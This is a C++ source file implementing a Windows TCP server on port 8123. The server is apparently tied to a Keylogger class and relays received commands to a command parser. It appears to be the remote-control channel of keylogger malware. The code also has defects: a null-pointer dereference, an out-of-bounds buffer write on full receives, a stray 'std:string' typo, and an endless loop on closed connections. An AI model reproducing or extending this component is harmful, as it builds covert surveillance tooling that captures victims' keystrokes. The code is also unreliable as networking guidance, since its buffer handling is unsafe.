#include "stdafx.h"
#include "SocketServer.h"

void SocketServer::initHostInfo() {
	char ac[80];
	if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR) {
		std::cerr << "Error " << WSAGetLastError() <<
			" when getting local host name." << endl;
	} else {
		this->hostName = ac;
	}
	

	struct hostent *phe = gethostbyname(ac);
	if (phe == 0) {
		std::cerr << "Yow! Bad host lookup." << endl;
	}

	std::string ip = "";
	for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
		struct in_addr addr;
		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));

		std:string possibleIp = inet_ntoa(addr);
		if (possibleIp.find('.') == 2 && possibleIp.at(0) == '1' || ip == "") {
			ip = possibleIp;
		}
	}
	
	this->ip = ip;
}

SocketServer::SocketServer(Keylogger* logger) {
	listenSocket = INVALID_SOCKET;

	std::wcout << L"socket";
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		cerr << "WSAStartup failed: " << result << "\n";
	}

	struct addrinfo* addr = nullptr;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM; 
	hints.ai_protocol = IPPROTO_TCP; 

	hints.ai_flags = AI_PASSIVE;

	this->initHostInfo();
	std::wcout << StringUtilities::s2ws(this->ip) << L" " << StringUtilities::s2ws(this->hostName) << std::endl;

	result = getaddrinfo(ip.c_str(), "8123", &hints, &addr);

	if (result != 0) {
		cerr << "getaddrinfo failed: " << result << "\n";
		WSACleanup();
	}

	this->listenSocket = socket(addr->ai_family, addr->ai_socktype,
		addr->ai_protocol);

	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "Error at socket: " << WSAGetLastError() << "\n";
		freeaddrinfo(addr);
		WSACleanup();
	}

	int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);

	if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
		cerr << "listen failed with error: " << WSAGetLastError() << "\n";
		closesocket(this->listenSocket);
		this->listenSocket = INVALID_SOCKET;
		WSACleanup();
	}
}

void SocketServer::start() {
	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "socket is not active" << std::endl;
		return;
	} else {
		std::wcout << "socket active" << std::endl;
	}

	wchar_t requestBuffer[SOCKET_BUFFER_SIZE];
	int clientSocket = INVALID_SOCKET;

	while (true) {
		clientSocket = accept(this->listenSocket, NULL, NULL);
		std::wcout << L"accepted client: " << clientSocket << std::endl;

		if (clientSocket == INVALID_SOCKET) {
			cerr << "accept failed: " << WSAGetLastError() << std::endl;
			closesocket(this->listenSocket);
			WSACleanup();
			continue;
		}

		while (true) {
			int receivedSize = recv(clientSocket, (char*)requestBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);
			
			
			std::wstring response;

			if (receivedSize == SOCKET_ERROR) {
				cerr << "recv failed: " << receivedSize << std::endl;
				break;
			} else if (receivedSize == 0) {
				cerr << "connection closed..." << std::endl;
			} else if (receivedSize > 0) {
				requestBuffer[receivedSize / 2] = '\0';
				std::wstring request = std::wstring(requestBuffer);
				std::wcout << L"received: " << request << std::endl;

				response = this->getResponse(request);

				int sendResult = send(clientSocket, (char*)response.c_str(),
					sizeof(wchar_t) * response.size(), 0);

				if (request.compare(L"exit") == 0) {
					break;
				}

				if (sendResult == SOCKET_ERROR) {
					cerr << "send failed: " << WSAGetLastError() << std::endl;
				}
			}
		}

		closesocket(clientSocket);
	}

}

std::wstring SocketServer::getResponse(std::wstring request) {
	return CommandParser::act(request);
}

std::string SocketServer::getHostName() {
	return this->hostName;
}